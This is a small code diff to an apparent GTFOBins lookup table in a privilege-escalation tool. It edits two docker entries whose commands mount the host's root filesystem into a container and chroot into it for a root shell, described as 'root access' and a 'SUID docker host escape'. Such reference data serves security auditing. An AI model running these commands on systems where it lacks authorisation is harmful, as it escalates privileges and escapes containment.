@@ -172,13 +172,13 @@ GTFOBINS_DB: tuple[GTFOBinsEntry, ...] = (
     GTFOBinsEntry(
         "docker",
         "sudo",
-        "sudo docker run -v /:/hostfs -it alpine chroot /hostfs /bin/bash",
+        "sudo docker run --rm -v /:/hostfs alpine chroot /hostfs /bin/bash",
         "Mount host filesystem via docker for root access",
     ),
     GTFOBinsEntry(
         "docker",
         "suid",
-        "docker run -v /:/hostfs -it alpine chroot /hostfs /bin/bash",
+        "docker run --rm -v /:/hostfs alpine chroot /hostfs /bin/bash",
         "SUID docker host escape",
     ),
     # --- dpkg ---
